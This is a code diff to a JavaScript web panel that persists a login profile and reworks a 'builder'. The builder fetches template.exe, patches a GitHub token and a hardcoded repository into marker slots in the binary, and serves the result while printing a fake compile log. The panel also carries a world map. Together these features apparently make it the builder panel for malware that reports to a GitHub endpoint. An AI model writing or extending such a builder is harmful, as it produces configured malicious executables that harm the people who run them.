@@ -44,6 +44,15 @@ function loadProfile() {
   const username = params.get("username");
 
   if (!username) {
+    // Try restoring from localStorage so browser refresh doesn't force re-login
+    const saved = localStorage.getItem("zx_profile");
+    if (saved) {
+      try {
+        profile = JSON.parse(saved);
+        renderProfile();
+        return;
+      } catch (e) {}
+    }
     window.location.href = "index.html";
     return;
   }
@@ -55,6 +64,8 @@ function loadProfile() {
     id: params.get("id") || "—",
   };
 
+  // Save so refresh works without re-login
+  localStorage.setItem("zx_profile", JSON.stringify(profile));
   renderProfile();
 }
 
@@ -99,10 +110,16 @@ function wireButtons() {
   });
 
   const logoutItem = $("logout-item");
-  if (logoutItem) logoutItem.addEventListener("click", () => (window.location.href = "index.html"));
+  if (logoutItem) logoutItem.addEventListener("click", () => {
+    localStorage.removeItem("zx_profile");
+    window.location.href = "index.html";
+  });
 
   const accountLogout = $("account-logout-btn");
-  if (accountLogout) accountLogout.addEventListener("click", () => (window.location.href = "index.html"));
+  if (accountLogout) accountLogout.addEventListener("click", () => {
+    localStorage.removeItem("zx_profile");
+    window.location.href = "index.html";
+  });
 
   const copyBtn = $("copy-id-btn");
   if (copyBtn) {
@@ -223,11 +240,12 @@ function wireBuilder() {
   function patchSlot(bytes, markerChar, slotChars, value) {
     const needle = encodeUtf16LE(markerChar.repeat(slotChars));
     const offset = findBytes(bytes, needle);
-    if (offset === -1) return;
+    if (offset === -1) return false;
     const safe = value.slice(0, slotChars - 1);
     const slot = new Uint8Array(slotChars * 2);
     slot.set(encodeUtf16LE(safe), 0);
     bytes.set(slot, offset);
+    return true;
   }
 
   buildBtn.addEventListener("click", () => {
@@ -238,10 +256,18 @@ function wireBuilder() {
     buildBtn.disabled    = true;
     log.innerHTML        = "";
 
+    const token = tokenInput ? tokenInput.value.trim() : localStorage.getItem("zx_gh_token") || "";
+    if (!token) {
+      addLine("ERROR: No GitHub token — paste your token and save it first.", "done");
+      building = false;
+      buildBtn.disabled = false;
+      return;
+    }
+
     const steps = [
       `Compiling sources for ${chosenName}...`,
       `Linking objects...`,
-      `Injecting endpoint...`,
+      `Injecting token and endpoint...`,
       `Packaging ${chosenName}...`,
       `Build complete: ${chosenName}`,
     ];
@@ -262,15 +288,20 @@ function wireBuilder() {
 
   downloadBtn.addEventListener("click", async () => {
     const token = tokenInput ? tokenInput.value.trim() : localStorage.getItem("zx_gh_token") || "";
-    if (!token) { showToast("Paste your GitHub token first"); return; }
+    if (!token) { showToast("Paste your GitHub token and save it first"); return; }
     const repo = "michaelrtrtr/michaelrtrtr.github.io";
     try {
       const res = await fetch("template.exe");
-      if (!res.ok) throw new Error("template.exe not found");
+      if (!res.ok) throw new Error("template.exe not found (status " + res.status + ")");
       const buffer = await res.arrayBuffer();
       const bytes  = new Uint8Array(buffer);
-      patchSlot(bytes, "K", 80, token);
-      patchSlot(bytes, "R", 64, repo);
+      const tokenOk = patchSlot(bytes, "K", 80, token);
+      const repoOk  = patchSlot(bytes, "R", 64, repo);
+      if (!tokenOk || !repoOk) {
+        showToast("Patch failed — template.exe markers missing. Re-upload template.exe.");
+        addLine("ERROR: Could not patch token/repo into template.exe — markers not found.", "done");
+        return;
+      }
       const blob = new Blob([bytes], { type: "application/octet-stream" });
       const url  = URL.createObjectURL(blob);
       const a    = document.createElement("a");
@@ -282,7 +313,8 @@ function wireBuilder() {
       URL.revokeObjectURL(url);
       showToast(`Downloading ${chosenName}`);
     } catch (err) {
-      showToast("Download failed — is template.exe uploaded?");
+      showToast("Download failed: " + err.message);
+      addLine("ERROR: " + err.message, "done");
     }
   });
 }
@@ -295,7 +327,7 @@ function initMap() {
   const map = L.map(mapEl, {
     center: [20, 0],
     zoom: 2,
-    minZoom: 1,
+    minZoom: 2,
     zoomControl: false,
     attributionControl: true,
     worldCopyJump: true,
